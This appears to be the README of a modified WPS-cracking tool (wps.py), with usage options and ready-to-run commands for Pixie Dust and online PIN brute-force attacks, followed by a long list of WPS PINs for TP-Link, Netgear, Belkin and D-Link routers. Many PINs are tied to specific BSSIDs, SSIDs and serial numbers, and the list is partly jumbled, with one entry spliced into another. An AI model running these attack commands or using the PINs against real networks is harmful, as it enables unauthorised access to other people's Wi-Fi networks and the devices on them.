## translated into Spanish 😀
# Usage
```
 wps.py <arguments>
 Required arguments:
     -i, --interface=<wlan0>  : Name of the interface to use

 Optional arguments:
     -b, --bssid=<mac>        : BSSID of the target AP
     -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
     -K, --pixie-dust         : Run Pixie Dust attack
     -B, --bruteforce         : Run online bruteforce attack
     --push-button-connect    : Run WPS push button connection

 Advanced arguments:
     -d, --delay=<n>          : Set the delay between pin attempts [0]
     -w, --write              : Write AP credentials to the file on success
     -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
     -X, --show-pixie-cmd     : Alway print Pixiewps command
     --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
     --iface-down             : Down network interface when the work is finished
     -l, --loop               : Run in a loop
     -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
     --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
     -v, --verbose            : Verbose output
 ```

## Usage examples
Start Pixie Dust attack on a specified BSSID:
 ```
 sudo python3 wps.py -i wlan0 -b 00:90:4C:C1:AC:21 -K
 ```
Show avaliable networks and start Pixie Dust attack on a specified network:
 ```
 sudo python3 wps.py -i wlan0 -K
 ```
Launch online WPS bruteforce with the specified first half of the PIN:
 ```
 sudo python3 wps.py -i wlan0 -b 00:90:4C:C1:AC:21 -B -p 1234
 ```
 Start WPS push button connection:s
 ```
 sudo python3 wps.py -i wlan0 --pbc
 ```
## modifications 
```

interface 

simplified and more minimalist 

wps pins

adding 46 wps pins to the list including tp-link pins
```
## list of added pins 
```
WPS-PIN: 66870913
Essid: TP-LINK_777; TP-LINK_FD69D0 after reset
Router model: TL-WR741N

Router model: TL-WR841N
WPS-PIN: 85075542

Router model: TL-WR842ND
WPS-PIN: 55117319

MODEL: TD-W8960N
BSSID: 74:EA:3A:BC:75:D6
WPS: 37211202

MODEL: TD-W8960N
BSSID: 90:F6:52:DE:23:1B
WPS: 95817149

MODEL: TD-W8960N
BSSID: F8:D1:11:7D:CC:54
WPS: 41441282

MODEL: TD-W8960N
BSSID: 90:F6:52:48:E1:73
WPS: 20917784

MODEL: TD-W8961ND
BSSID: 90:f6:52:56:93:5c
WPS: 56738209

MODEL: TD-W8961ND
BSSID: b0:48:7a:d5:e4:6d
WPS: 40176451

MODEL: TD-W8961ND
BSSID: b0:48:7a:d1:cc:79
WPS: 37493691

MODEL: TD-W8961ND
BSSID: b0:48:7a:f0:b1:08
WPS: 57739601

MODEL: TD-W8961ND
BSSID: b0:48:7a:d5:e7:a6
WPS: 40184708

MODEL: TD-W8961ND
BSSID: b0:48:7a:d5:e0:66
WPS: 40166148

MODEL: TD-W8961ND
SSID: TP-LINK_8F2DFA
BSSID: f8:d1:11:8f:2d:fa
WPS: 93834186

MODEL: TD-W8961ND
BSSID: f8:d1:11:8f:21:a3
WPS: 93802598

MODEL: TD-W8961ND
BSSID: b0:48:7a:d1:d0:eb
WPS: 37505073

MODEL: TD-W8961ND
SSID: wirelessnetwork
BSSID: b0:48:7a:f5:d8:2b
WPS: 61116597

MODEL: TD-W8961ND
BSSID: b0:48:7a:d1:cc:ca
WPS: 37494506

MODEL: TD-W8961ND
BSSID: b0:48:7a:d1:cc:9e
WPS: 37494063

MODEL: TD-W8961ND
SSID: TP-LINK_D1CAA5
BSSID: b0:48:7a:d1:ca:a5
WPS: 37489014

MODEL: TD-W8961ND
SSID: wireless
BSSID: b0:48:7a:d1:cd:68
WPS: 37496081

MODEL: TD-W896N1D
BSSID: b0:48:7a:d1:cc:d9
WPS: 37494650

MODEL: TD-W8961ND
BSSID: b0:48:7a:d1:cb:0b
WPS: 37490034
---------------------
netgear devices
Spoiler (Click to Hide)
MODEL: NETGEAR DGN1000
BSSID: E0:46:9A:0A:69:4A (wlan)
BSSID: 00:25:D3:BE:2E:00 (ADSL)
WPS: 19004938

MODEL: Netgear DGN1000
BSSID: E0:91:F5:43:48:10 (wlan)
BSSID: E0:91:F5:43:48:11 (ADSL)
WPS: 82234577

MODEL: Netgear DGN1000
BSSID: 30:46:9A:1E:EE:BA (wlan)
BSSID: 30:46:9A:1E:EE:BB (ADSL)
WPS: 30022645

MODEL: NETGEAR DGN1000
BSSID: 00:26:F2:41:9E:DA (wlan)
BSSID: 00:26:F2:41:9E:DB (ADSL)
WPS: 32312966

MODEL: NETGEAR DGN1000
BSSID: 30:46:9A:28:A3:7A (wlan)
BSSID: 30:46:9A:28:A3:7B (ADSL)
WPS: 27334959

MODEL: NETGEAR DGN1000

Model: Netgear WNR2000
WPS Pin: 50292127

BSSID: 00:26:F2:41:98:2C (wlan)
BSSID: 00:26:F2:41:98:2D (ADSL)
WPS: 37380342

MODEL: Netgear DGN2000
BSSID: 00:24:B2:3F:4A:EC (wlan)
BSSID: 00:24:B2:3F:4A:ED (ADSL)
WPS: 38686191

MODEL: NETGEAR DG834GU
BSSID: 00:26:F2:78:FB:3E (wlan)
BSSID: 00:26:F2:78:FB:41 (ADSL)
WPS: 64426679
-------------------------
Belkin devices
Spoiler (Click to Hide)
MODEL: Belkin F9J1102 v1
BSSID: EC:1A:59:2B:92:46 (WLAN)
BSSID: EC:1A:59:2B:92:47 (WAN)
SERIAL: 121230HF102382
WPS: 19366838

MODEL: Belkin F9J1102 v1
SSID: belkin.b82
BSSID: 08:86:3B:DA:1B:82 (WLAN)
BSSID: 08:86:3B:DA:1B:83 (WAN)
SERIAL: 121212HF111888
WPS: 87279320

MODEL: Belkin F9J1102 v1
BSSID: 08:86:3B:DA:36:72 (WLAN)
BSSID: 08:86:3B:DA:36:73 (WAN)
SERIAL: 121212HF113612
WPS: 83469909

MODEL: Belkin F9J1102 v1
SSID: belkin.630
BSSID: 08:86:3B:DB:36:30 (WLAN)
BSSID: 08:86:3B:DB:36:31 (WAN)
SERIAL: 121213HF100703
WPS: 14159114

MODEL: Belkin F7D4401 v1
SSID: belkin.96b3
BSSID: 94:44:52:F6:B3:B5 (WLAN)
BSSID: 94:44:52:F6:B3:B6 (WAN)
SERIAL: 121107H4101566
WPS: 15310828

MODEL: Belkin F7D4401 v1
BSSID: 08:86:3B:08:55:22 (WLAN)
BSSID: 08:86:3B:08:55:23 (WAN)
SERIAL: 121110H4100034
WPS: 36323364

MODEL: Belkin F7D4401 v1
SSID: belkin.9643
BSSID: 94:44:52:F6:B6:26 (WAN)
BSSID: 94:44:52:F6:B6:25 (WLAN)
SERIAL: 121107H4101722
WPS: 17579957

MODEL: Belkin F7D4401 v1
SSID: belkin.9689
BSSID: 08:86:3B:27:46:81 (WAN)
BSSID: 08:86:3B:27:46:80 (WLAN)
SERIAL: 121119H4100938
WPS: 08112118

MODEL: BELKIN N+ F5D8635-4v1
SSID: Belkin
BSSID: 00:22:75:AC:3F:DC (WAN)
BSSID: 00:22:75:AC:3F:DA (WLAN)
WPS: 12885381

MODEL: Belkin F5D8635-4v1
BSSID: 94:44:52:2D:95:C3 (WLAN)
BSSID: 94:44:52:2D:95:C5 (WAN)
WPS: 29874590

MODEL: Belkin F7D3402 v1
SSID: Belkin.81D9
BSSID: 94:44:52:9E:11:DA (WAN)
BSSID: 94:44:52:9E:11:D9 (WLAN)
SERIAL: 121029H3104154
WPS: 08318725
--------------------------
Dlink devices
Spoiler (Click to Hide)

MODEL: DIR-655
WPS-PIN: 95061771
Essid: D-Link DIR-655; dlink after reset

MODEL: DSL-2740B-F1
BSSID: 14:D6:4D:91:C2:73 (wlan)
BSSID: 14:D6:4D:91:C2:72 (ADSL)
WPS: 44686871

MODEL: DSL-2740B
BSSID: 14:D6:4D:F3:F8:E8 (wlan)
BSSID: 14:D6:4D:F3:F8:E7 (ADSL)
WPS: 59185239
-------------------
